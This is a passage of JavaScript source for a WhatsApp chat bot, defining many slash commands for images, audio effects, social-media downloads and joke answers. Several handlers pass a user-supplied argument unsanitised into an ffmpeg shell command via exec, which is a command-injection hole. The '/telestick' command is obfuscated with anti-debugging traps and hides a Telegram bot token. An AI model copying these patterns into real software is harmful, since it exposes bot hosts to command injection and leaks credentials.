            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeneko':{
ZeroStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animepat':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeslap':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animecuddle':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animewaifu':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animenom':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animefoxgirl':{
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animetickle': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animegecg': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/dogwoof': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/8ballpool': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/goosebird': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animefeed': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/animeavatar': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/lizardpic': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '/catmeow': {
ZeroStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await client.sendMessage(from, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
    case '/igemoji': 
case '/instagramemoji': 
if (!q) return replygcZero("Enter emoji, maximum 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "11")
break
case '/iphoneemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "0")
break
case '/googleemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "1")
break
case '/samsungemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "2")
break
case '/microsoftemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "3")
break
case '/whatsappemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "4")
break
case '/twitteremoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "5")
break
case '/facebookemoji': 
case '/fbemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "6")
break
case '/skypeemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "7")
break
case '/joyemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "8")
break
case '/mojiemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "9")
case '/pediaemoji': 
if (!q) return replygcZero("Enter emoji, max 1 emoji, eg?" + ` ${prefixo + command} 😀`)
ZeroStickWait()
emote(q, "10")
break
case '/emoji': {
if (!args.join(" ")) return replygcZero('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await client.sendMessage(from, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await client.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case '/volume': {
if (!args.join(" ")) return replygcZero(`Example: ${prefixo + command} 10`)
media = await client.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcZero('Error!')
jadie = fs.readFileSync(rname)
client.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcZero('Error!')
jadie = fs.readFileSync(rname)
client.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcZero("Send video/audio")
}
}
break
 case '/tinyurl':{
   if(!q) return replygcZero('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcZero(body)
  } catch (e) {
  replygcZero(e)
  }
  })
  }
 break
case '/git': case '/gitclone':
if (!args[0]) return replygcZero(`Where is the link?\nExample :\n${prefixo}${command} https://github.com/DGXeon/Media`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcZero(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    client.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcZero(mess.error))
break
case "/spotify":{
if (!isPrem) return replyprem(mess.premium)
if (!text) return replygcZero(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcZero(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await client.sendMessage(from, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await client.sendMessage(from, { audio: bufferpotify }, { quoted: response })
        }
break
case '/bass': case '/blown': case '/deep': case '/earrape': case '/fast': case '/fat': case '/nightcore': case '/reverse': case '/robot': case '/slow': case '/smooth': case '/squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                ZeroStickWait()
                let media = await client.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcZero(err)
                let buff = fs.readFileSync(ran)
                client.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcZero(`Reply to the audio you want to change with a caption *${prefixo + command}*`)
                } catch (e) {
                replygcZero(e)
                }
                break
                case '/udict': 
if (!q) return replygcZero(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcZero(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   client.sendMessage(from,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcZero(`*${q}* isn't a valid text`)
    }
    break
                case '/can': {
            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcZero(jawab)
            }
            break
            case '/is': {
            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcZero(jawab)
            }
            break
            case '/when': {
            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcZero(jawab)
            }
            break
case '/what': {
            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcZero(jawab)
            }
            break
case '/where': {
if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcZero(jawab)
            }
            break
case '/how': {
            	if (!text) return replygcZero(`Ask question\n\nExample : ${prefixo + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcZero(jawab)
            }
            break
case '/rate': {
            	if (!text) return replygcZero(`Example : ${prefixo + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcZero(jawab)
            }
            break
            case '/runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcZero(lowq)
            	}
            break
            case '/stupidcheck':case '/uncleancheck':
case '/hotcheck': case '/smartcheck':
case '/greatcheck':
case '/evilcheck':case '/dogcheck':
case '/coolcheck':
case '/waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const Zerokak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
client.sendMessage(from, { text: Zerokak }, { quoted: m })
break
            case '/soulmate': {
            if (!m.isGroup) return ZeroStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
client.sendMessage(from,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/zero-bot.png`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case '/couple': {
            if (!m.isGroup) return ZeroStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
client.sendMessage(from,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/zero-bot.png`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case '/coffee': case '/kopi': {
                client.sendMessage(from, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case '/wallpaper': {
                if (!text) return replygcZero('Enter Query Title')
                ZeroStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                client.sendMessage(from, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case '/wikimedia': {
                if (!text) return replygcZero('Enter Query Title')
                ZeroStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                client.sendMessage(from, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case '/pick': {
            	if (!m.isGroup) return ZeroStickGroup()
            	if (!text) return replygcZero(`What do you want to pick?\nExample: ${prefixo + command} idiot`)
             const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let Zeroshimts = member[Math.floor(Math.random() * member.length)]
             client.sendMessage(from, { 
text: `The most *${text}* here is *@${Zeroshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[Zeroshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/zero-bot.png`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case "/igvid": case "/instavid": {
if (!text) return replygcZero(`Where is the link?\n\nExample : ${prefixo + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
ZeroStickWait()
let resZeroyinsta = await ZeroInstaMp4(text)
const gha1 = await client.sendMessage(from,{video:{url: resZeroyinsta.url[0].url},caption: mess.success},{quoted:m})
}
break
case '/igstalk': {
if (!args[0]) return replygcZero(`Enter Instagram Username\n\nExample: ${prefixo + command} unucorn_Zero13`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await client.sendMessage(from, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        replygcZero(`Make sure the username comes from *Instagram*`)
      }
}
break
           case "/igimg": case "/instaimg":  {
if (!text) return replygcZero(`Where is the link?\n\nExample : ${prefixo + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
ZeroStickWait()
const risponsZero = await ZeroIgImg(text)
for (let i=0;i<risponsZero.length;i++) {
let ghd = await client.sendFileUrl(m.chat, risponsZero[i], `Here you go!`, m)
}
}
break 
case "/fbvid": case "/facebookvid":{
if (!text) return replygcZero(`Where is the url?\n\nExample: ${prefixo + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
ZeroStickWait()
let res = await ZeroFb(q)
let ghdp = await client.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
case "/twittervid":case "/twitvid":{
if (!text) return replygcZero(`Where is the url?\n\nExample: ${prefixo + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
ZeroStickWait()
let res = await ZeroTwitter(q)
let ghdx = await client.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
    case '/saybengali': case '/ttsbengali': case '/gttsbengali':{
        if (!text && m.quoted) {
            message = `${m.quoted ? m.quoted.msg : ""}`;
          } else if (args[0]) {
            message = args.join(" ");
          } else {
            message = `Amay bolar jonno kono text dao ${pushName} senpai !`;
          }
      
          const texttospeechurl = ttt.getAudioUrl(message, {
            lang: "bn",
            slow: false,
            host: "https://translate.google.com",
          });
      
          client.sendMessage(
            m.chat,
            { audio: { url: texttospeechurl }, mimetype: "audio/mpeg" },
            { quoted: m }
          ).catch((e) => {
            m.reply(`An error Occurd !`);
          });}
        break
        case '/sayhindi': case '/ttshindi': case '/gttshindi':{
            if (!text && m.quoted) {
                message = `${m.quoted ? m.quoted.msg : ""}`;
              } else if (args[0]) {
                message = args.join(" ");
              } else {
                message = `Mujhe bolne ke liye kuch text do ${pushName} senpai !`;
              }
          
              const texttospeechurl = ttt.getAudioUrl(message, {
                lang: "hi",
                slow: false,
                host: "https://translate.google.com",
              });
          
              client.sendMessage(
                m.chat,
                { audio: { url: texttospeechurl }, mimetype: "audio/mpeg" },
                { quoted: m }
              ).catch((e) => {
                m.reply(`An error Occurd !`);
              });}
            break
            case '/sayspanish': case '/ttsspanish': case '/gttsspanish':{
                if (!text && m.quoted) {
                    message = `${m.quoted ? m.quoted.msg : ""}`;
                  } else if (args[0]) {
                    message = args.join(" ");
                  } else {
                    message = `Please provide me a text to say ${pushName} senpai !`;
                  }
              
                  const texttospeechurl = ttt.getAudioUrl(message, {
                    lang: "es",
                    slow: false,
                    host: "https://translate.google.com",
                  });
              
                  client.sendMessage(
                    m.chat,
                    { audio: { url: texttospeechurl }, mimetype: "audio/mpeg" },
                    { quoted: m }
                  ).catch((e) => {
                    m.reply(`An error Occurd !`);
                  });}
                break
                case '/sayjapan': case '/ttsjapan': case '/gttsjapan':{
                    if (!text && m.quoted) {
                        message = `${m.quoted ? m.quoted.msg : ""}`;
                      } else if (args[0]) {
                        message = args.join(" ");
                      } else {
                        message = `Please provide me a text to say ${pushName} senpai !`;
                      }
                  
                      const texttospeechurl = ttt.getAudioUrl(message, {
                        lang: "ja",
                        slow: false,
                        host: "https://translate.google.com",
                      });
                  
                      client.sendMessage(
                        m.chat,
                        { audio: { url: texttospeechurl }, mimetype: "audio/mpeg" },
                        { quoted: m }
                      ).catch((e) => {
                        m.reply(`An error Occurd !`);
                      });}
                    break
        case '/telestick': { //credit agan
        	if (m.isGroup) return ZeroStickPrivate()
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await client[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
    case '/fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcZero(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    
case '/myip': {
        if (!ZeroTheCreator) return ZeroStickOwner()
        if (m.isGroup) return ZeroStickPrivate()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcZero("🔎 My public IP address is: " + ip)
                    })
                })
            }
        break
        case '/mathquiz': case '/math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcZero(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefixo}math medium`)
                let result = await genMath(text.toLowerCase())
                client.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygcZero("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case '/lyrics': {
if (!text) return replygcZero(`What lyrics you looking for?\nExample usage: ${prefixo}lyrics Thunder`)
ZeroStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
